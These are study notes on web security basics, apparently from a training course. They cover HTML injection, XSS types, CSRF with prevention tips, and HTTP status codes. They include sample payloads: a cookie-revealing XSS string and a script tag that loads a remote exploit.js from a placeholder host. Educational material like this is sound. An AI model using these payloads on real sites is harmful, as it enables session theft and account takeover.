### HTML Injection

----
HTML injection occurs when unfiltered user input is displayed on the page. This can either be through retrieving previously submitted code, like retrieving a user comment from the back end database, or by directly displaying unfiltered user input through JavaScript on the front end.
*Injection Example*
```html
<style> body { background-image: url('https://academy.hackthebox.com/images/logo.svg'); } </style>
```

### XSS Basics

----
| Type | Description |
| --- | --- |
|Reflected XSS | Occurs when user input is displayed on the page after processing (e.g., search result or error message).|
|Stored XSS | Occurs when user input is stored in the back end database and then displayed upon retrieval (e.g., posts or comments).|
|DOM XSS | Occurs when user input is directly shown in the browser and is written to an HTML DOM object (e.g., vulnerable username or page title).|

```javascript
#"><img src=/ onerror=alert(document.cookie)>
```


### Cross-Site Request Forgery (CSRF)

----

A common CSRF attack to gain higher privileged access to a web application is to craft a JavaScript payload that automatically changes the victim's password to the value set by the attacker. 
Once the victim views the payload on the vulnerable page (e.g., a malicious comment containing the JavaScript CSRF payload), the JavaScript code would execute automatically. 
It would use the victim's logged-in session to change their password. Once that is done, the attacker can log in to the victim's account and control it.

*Example loading remote exploit.js file*
```javascript
"><script src=//www.example.com/exploit.js></script>
```
Prevention:
Web-App Firewall and/or

| Type | Description |
| --- | --- |
| Sanitization |	Removing special characters and non-standard characters from user input before displaying it or storing it.|
|Validation |	Ensuring that submitted user input matches the expected format (i.e., submitted email matched email format)|

[OWASP CSRF Guide](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

### Web Request Codes

| Code |	Description |
|---|---|
|*Successful* | *responses*|  	
|200 OK |	The request has succeeded|
201 Created | Request led to creation of resource (POST)
|*Redirection*| *messages* |
|301 Moved Permanently |	The URL of the requested resource has been changed permanently
|302 Found| 	The URL of the requested resource has been changed temporarily|
|*Client error*| *responses* 	|
|400 Bad Request| 	The server could not understand the request due to invalid syntax|
|401 Unauthorized| 	Unauthenticated attempt to access page|
403 Forbidden |	The client does not have access rights to the content
404 Not Found |	The server can not find the requested resource
405 Method Not Allowed |	The request method is known by the server but has been disabled and cannot be used
408 Request Timeout |	This response is sent on an idle connection by some servers, even without any previous request by the client
|*Server error* | *responses* | 	
500 Internal Server Error |	The server has encountered a situation it doesn't know how to handle
502 Bad Gateway |	The server, while working as a gateway to get a response needed to handle the request, received an invalid response
504 Gateway Timeout |	The server is acting as a gateway and cannot get a response in time
